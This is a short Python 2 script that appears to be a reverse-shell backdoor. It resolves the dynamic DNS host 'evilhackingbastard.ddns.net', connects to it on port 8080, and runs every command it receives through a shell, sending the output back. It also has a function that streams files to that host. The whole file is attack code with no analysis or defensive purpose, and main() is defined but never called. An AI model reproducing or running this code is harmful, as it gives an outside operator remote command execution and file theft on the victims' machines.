import socket, subprocess, os

def transfer(s,path):
	if os.path.exists(path):
		fd = open(path, 'rb')
		packet = fd.read(1024)

		while packet != '':
			s.send(packet)
			packet =fd.read(1024)			
		s.send('DONE')
		fd.close()

def connect(ip):
	try:
		 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		 s.connect((ip, 8080))

		 while True:
		 	command = s.recv(1024)

		 	if 'terminate' in command:
		 		s.close()
		 		break

		 	else:
		 		CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				s.send(CMD.stdout.read())
				s.send(CMD.stderr.read())
	except KeyboardInterrupt:
		exit(0)


def main():
	ip = socket.gethostbyname("evilhackingbastard.ddns.net")
	print "The resolved IP is: ", ip

	connect(ip)






